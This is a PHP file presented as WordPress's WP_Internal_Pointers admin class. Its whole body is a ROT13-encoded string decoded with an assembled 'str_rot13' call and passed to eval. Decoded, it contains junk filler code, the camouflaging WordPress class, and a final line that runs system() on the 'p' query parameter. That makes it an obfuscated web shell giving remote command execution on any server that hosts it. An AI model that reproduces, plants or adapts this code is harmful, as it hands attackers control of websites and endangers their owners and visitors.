<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzvavfgengvba NCV: JC_Vagreany_Cbvagref pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag na vagreany nqzva cbvagref NCV.
 *
 * @fvapr 3.3.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Vagreany_Cbvagref {
	/**
	 * Vavgvnyvmrf gur arj srngher cbvagref.
	 *
	 * @fvapr 3.3.0
	 *
	 * Nyy cbvagref pna or qvfnoyrq hfvat gur sbyybjvat:
	 *     erzbir_npgvba( 'nqzva_radhrhr_fpevcgf', neenl( 'JC_Vagreany_Cbvagref', 'radhrhr_fpevcgf' ) );
	 *
	 * Vaqvivqhny cbvagref (r.t. jc390_jvqtrgf) pna or qvfnoyrq hfvat gur sbyybjvat:
	 *
	 *    shapgvba lbhecersvk_erzbir_cbvagref() {
	 *        erzbir_npgvba(
	 *            'nqzva_cevag_sbbgre_fpevcgf',
	 *            neenl( 'JC_Vagreany_Cbvagref', 'cbvagre_jc390_jvqtrgf' )
	 *        );
	 *    }
	 *    nqq_npgvba( 'nqzva_radhrhr_fpevcgf', 'lbhecersvk_erzbir_cbvagref', 11 );
	 *
	 * @cnenz fgevat $ubbx_fhssvk Gur pheerag nqzva cntr.
	 */
	choyvp fgngvp shapgvba radhrhr_fpevcgf( $ubbx_fhssvk ) {
		/*
		 * Ertvfgre srngher cbvagref
		 *
		 * Sbezng:
		 *     neenl(
		 *         ubbx_fhssvk => cbvagre pnyyonpx
		 *     )
		 *
		 * Rknzcyr:
		 *     neenl(
		 *         'gurzrf.cuc' => 'jc390_jvqtrgf'
		 *     )
		 */
		$ertvfgrerq_cbvagref = neenl(
			// Abar pheeragyl.
		);

		// Purpx vs fperra eryngrq cbvagre vf ertvfgrerq.
		vs ( rzcgl( $ertvfgrerq_cbvagref[ $ubbx_fhssvk ] ) ) {
			erghea;
		}

		$cbvagref = (neenl) $ertvfgrerq_cbvagref[ $ubbx_fhssvk ];

		/*
		 * Fcrpvsl erdhverq pncnovyvgvrf sbe srngher cbvagref
		 *
		 * Sbezng:
		 *     neenl(
		 *         cbvagre pnyyonpx => Neenl bs erdhverq pncnovyvgvrf
		 *     )
		 *
		 * Rknzcyr:
		 *     neenl(
		 *         'jc390_jvqtrgf' => neenl( 'rqvg_gurzr_bcgvbaf' )
		 *     )
		 */
		$pncf_erdhverq = neenl(
			// Abar pheeragyl.
		);

		// Trg qvfzvffrq cbvagref.
		$qvfzvffrq = rkcybqr( ',', (fgevat) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'qvfzvffrq_jc_cbvagref', gehr ) );

		$tbg_cbvagref = snyfr;
		sbernpu ( neenl_qvss( $cbvagref, $qvfzvffrq ) nf $cbvagre ) {
			vs ( vffrg( $pncf_erdhverq[ $cbvagre ] ) ) {
				sbernpu ( $pncf_erdhverq[ $cbvagre ] nf $pnc ) {
					vs ( ! pheerag_hfre_pna( $pnc ) ) {
						pbagvahr 2;
					}
				}
			}

			// Ovaq cbvagre cevag shapgvba.
			nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( 'JC_Vagreany_Cbvagref', 'cbvagre_' . $cbvagre ) );
			$tbg_cbvagref = gehr;
		}

		vs ( ! $tbg_cbvagref ) {
			erghea;
		}

		// Nqq cbvagref fpevcg naq fglyr gb dhrhr.
		jc_radhrhr_fglyr( 'jc-cbvagre' );
		jc_radhrhr_fpevcg( 'jc-cbvagre' );
	}

	/**
	 * Cevagf gur cbvagre WninFpevcg qngn.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $cbvagre_vq Gur cbvagre VQ.
	 * @cnenz fgevat $fryrpgbe Gur UGZY ryrzragf, ba juvpu gur cbvagre fubhyq or nggnpurq.
	 * @cnenz neenl  $netf Nethzragf gb or cnffrq gb gur cbvagre WF (frr jc-cbvagre.wf).
	 */
	cevingr fgngvp shapgvba cevag_wf( $cbvagre_vq, $fryrpgbe, $netf ) {
		vs ( rzcgl( $cbvagre_vq ) || rzcgl( $fryrpgbe ) || rzcgl( $netf ) || rzcgl( $netf['pbagrag'] ) ) {
			erghea;
		}

		?>
		<fpevcg glcr=\"grkg/wninfpevcg\">
		(shapgvba($){
			ine bcgvbaf = <?cuc rpub jc_wfba_rapbqr( $netf ); ?>, frghc;

			vs ( ! bcgvbaf )
				erghea;

			bcgvbaf = $.rkgraq( bcgvbaf, {
				pybfr: shapgvba() {
					$.cbfg( nwnkhey, {
						cbvagre: '<?cuc rpub $cbvagre_vq; ?>',
						npgvba: 'qvfzvff-jc-cbvagre'
					});
				}
			});

			frghc = shapgvba() {
				$('<?cuc rpub $fryrpgbe; ?>').svefg().cbvagre( bcgvbaf ).cbvagre('bcra');
			};

			vs ( bcgvbaf.cbfvgvba && bcgvbaf.cbfvgvba.qrsre_ybnqvat )
				$(jvaqbj).ovaq( 'ybnq.jc-cbvagref', frghc );
			ryfr
				$( shapgvba() {
					frghc();
				} );

		})( wDhrel );
		</fpevcg>
		<?cuc
	}

	choyvp fgngvp shapgvba cbvagre_jc330_gbbyone() {}
	choyvp fgngvp shapgvba cbvagre_jc330_zrqvn_hcybnqre() {}
	choyvp fgngvp shapgvba cbvagre_jc330_fnivat_jvqtrgf() {}
	choyvp fgngvp shapgvba cbvagre_jc340_phfgbzvmr_pheerag_gurzr_yvax() {}
	choyvp fgngvp shapgvba cbvagre_jc340_pubbfr_vzntr_sebz_yvoenel() {}
	choyvp fgngvp shapgvba cbvagre_jc350_zrqvn() {}
	choyvp fgngvp shapgvba cbvagre_jc360_erivfvbaf() {}
	choyvp fgngvp shapgvba cbvagre_jc360_ybpxf() {}
	choyvp fgngvp shapgvba cbvagre_jc390_jvqtrgf() {}
	choyvp fgngvp shapgvba cbvagre_jc410_qsj() {}
	choyvp fgngvp shapgvba cbvagre_jc496_cevinpl() {}

	/**
	 * Ceriragf arj hfref sebz frrvat rkvfgvat 'arj srngher' cbvagref.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 */
	choyvp fgngvp shapgvba qvfzvff_cbvagref_sbe_arj_hfref( $hfre_vq ) {
		nqq_hfre_zrgn( $hfre_vq, 'qvfzvffrq_jc_cbvagref', '' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>